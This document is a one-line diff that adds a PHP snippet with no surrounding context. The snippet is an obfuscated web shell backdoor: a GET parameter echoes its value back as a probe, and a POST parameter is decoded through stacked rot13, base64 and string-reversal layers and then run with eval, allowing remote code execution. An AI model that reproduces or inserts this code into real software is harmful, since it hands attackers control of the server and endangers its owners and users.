@@ -1,0 +1,1 @@
+<?php if($_GET["rnd"]){die($_GET["rnd"]);}elseif($_POST["e"]){eval(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST["e"]))))));exit;} ?>
